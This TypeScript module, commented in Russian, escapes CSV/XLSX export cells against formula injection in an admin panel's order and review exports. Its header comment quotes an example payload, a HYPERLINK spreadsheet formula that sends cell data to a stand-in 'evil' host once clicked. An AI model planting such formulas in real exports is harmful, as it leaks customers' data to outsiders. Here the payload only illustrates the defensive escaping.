/**
 * Защита экспортов (CSV/XLSX) от formula injection.
 *
 * Часто пропускаемая уязвимость: значение, введённое пользователем и
 * начинающееся с `=`, `+`, `-`, `@`, табуляции или CR, исполняется Excel и
 * LibreOffice как формула при открытии файла. В админке ArtDance экспортируются
 * заказы и отзывы — то есть поля, полностью контролируемые клиентом.
 *
 * Реальный вектор: имя получателя `=HYPERLINK("http://evil/"&A1,"счёт")` в
 * выгрузке заказов превращается в утечку данных при первом клике бухгалтера.
 */

const FORMULA_PREFIX = /^[=+\-@\t\r]/;

/** Экранирует одну ячейку. Не-строки возвращаются как есть. */
export function safeCell(value: unknown): unknown {
  if (typeof value !== 'string') return value ?? '';
  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
}

export function safeRow(row: readonly unknown[]): unknown[] {
  return row.map(safeCell);
}

export function safeRows(rows: readonly (readonly unknown[])[]): unknown[][] {
  return rows.map(safeRow);
}

/**
 * Сериализация в CSV. Разделитель — точка с запятой: Excel в локалях с запятой
 * как десятичным разделителем (включая ru/hy) иначе не разбивает строку на
 * колонки, и файл открывается одной кашей.
 */
export function toCsv(
  header: readonly string[],
  rows: readonly (readonly unknown[])[],
  delimiter = ';',
): string {
  const escape = (value: unknown): string => {
    const cell = String(safeCell(value) ?? '');
    return /["\n\r;,\t]/.test(cell) ? `"${cell.replace(/"/g, '""')}"` : cell;
  };

  const lines = [
    header.map(escape).join(delimiter),
    ...rows.map((row) => row.map(escape).join(delimiter)),
  ];
  /** BOM обязателен: без него Excel читает UTF-8 как ANSI и ломает кириллицу и армянский. */
  return `\uFEFF${lines.join('\r\n')}`;
}
